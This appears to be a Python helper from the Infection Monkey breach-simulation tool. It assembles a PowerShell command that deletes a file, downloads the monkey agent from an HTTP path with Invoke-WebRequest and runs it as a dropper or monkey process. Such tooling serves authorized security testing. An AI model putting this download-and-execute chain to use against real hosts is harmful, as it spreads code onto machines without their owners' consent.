from typing import List

from . import DownloadParams, RunParams
from infection_monkey.model import DROPPER_ARG, MONKEY_ARG

POWERSHELL_BASE_CMD = "powershell -NoLogo -Command"
POWERSHELL_CHECK_AND_DELETE = "if (Test-Path '{monkey_path}'){{ Remove-Item {monkey_path} }}"
POWERSHELL_HTTP_DOWNLOAD = "Invoke-WebRequest -Uri '{http_path}' -OutFile '{monkey_path}' -UseBasicParsing"
POWERSHELL_RUN_MONKEY = "{monkey_path} {run_type} {params}"


def download_and_run(download_params: DownloadParams,
                     run_params: RunParams):
    check_and_delete_cmd = POWERSHELL_CHECK_AND_DELETE.format(monkey_path=download_params.dst_path)
    download_cmd = POWERSHELL_HTTP_DOWNLOAD.format(http_path=download_params.src_http_path,
                                                   monkey_path=download_params.dst_path)
    run_cmd = POWERSHELL_RUN_MONKEY.format(monkey_path=run_params.path,
                                           run_type=(DROPPER_ARG if run_params.detached_run else MONKEY_ARG),
                                           params=run_params.run_options)
    return join_ps_commands([check_and_delete_cmd, download_cmd, run_cmd])


def join_ps_commands(cmds: List[str]) -> str:
    if not cmds[0].startswith(POWERSHELL_BASE_CMD):
        cmds[0] = POWERSHELL_BASE_CMD + ' ' + cmds[0]
    separator = '; '
    return separator.join(cmds)
